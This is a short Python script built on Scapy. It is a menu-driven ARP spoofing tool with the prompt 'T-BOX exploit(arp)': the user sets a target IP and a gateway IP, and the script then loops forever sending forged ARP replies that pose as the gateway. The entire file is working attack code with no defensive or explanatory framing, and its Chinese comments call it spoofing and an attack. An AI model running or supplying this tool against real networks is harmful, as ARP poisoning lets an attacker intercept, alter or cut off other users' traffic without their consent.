from scapy.all import ARP,Ether,sendp
import time

def arp(ip1,ip2):
    pkt = Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip1,psrc=ip2)#构造ARP欺骗包
    sendp(pkt)#发送
def main_arp(ip1,ip2):
    i = 1 
    while True:
        arp(ip1,ip2)
        time.sleep(0.5)
        print('[*]send Ether/ARP ==> '+ip1+'  number:'+str(i))
        i = i + 1
    print('[*]攻击已停止')
    
gateway = '0.0.0.0'
rhosts = '0.0.0.0'
while True:
    cmd = input('T-BOX exploit(arp) >')
    if cmd == 'show options':
        print('                                                          ')
        print('----------name---------content------------present---------')
        print('       rhosts      '+rhosts+'             目标IP              ')
        print('       gateway     '+gateway+'             网关IP              ')
        print('----------------------------------------------------------------')
    elif cmd[:10] == 'set rhosts':
        rhosts = cmd[11:]
        print('[*]rhosts ==> '+ rhosts)

    elif cmd[:11] == 'set gateway':
        gateway = cmd[12:]
        print('[*]gateway ==> ' + gateway)

    elif cmd == 'run':
        if rhosts == '0.0.0.0' or gateway == '0.0.0.0':
            print('[-]请设置目标IP以及网关')
        else:
            main_arp(ip1=rhosts,ip2=gateway)

    elif cmd == '':
        pass

    elif cmd == 'back':
        break

    else:
        print("[-]can't find command: " + cmd)


